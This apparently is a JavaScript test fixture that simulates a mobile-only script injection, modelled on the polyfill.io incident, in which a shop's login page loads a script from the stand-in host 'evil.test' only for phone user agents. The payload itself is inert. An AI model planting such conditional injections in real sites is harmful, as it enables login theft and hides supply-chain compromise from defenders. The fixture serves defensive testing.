// Attack: a script served only to phones (polyfill.io's payload ran only on mobile).
import * as baseline from './baseline.js';

export function respond(ctx) {
  if (ctx.host === 'shop.test' && ctx.path === '/login' && /Android|Mobile/.test(ctx.userAgent)) {
    const body = baseline.pages['/login'](ctx).replace('</main>', `<script src="${ctx.origin('evil.test')}/m.js"></script></main>`);
    return { headers: baseline.headers, body };
  }
  if (ctx.host === 'evil.test' && ctx.path === '/m.js') return { body: 'window.m = 1;' };
  return baseline.respond(ctx);
}
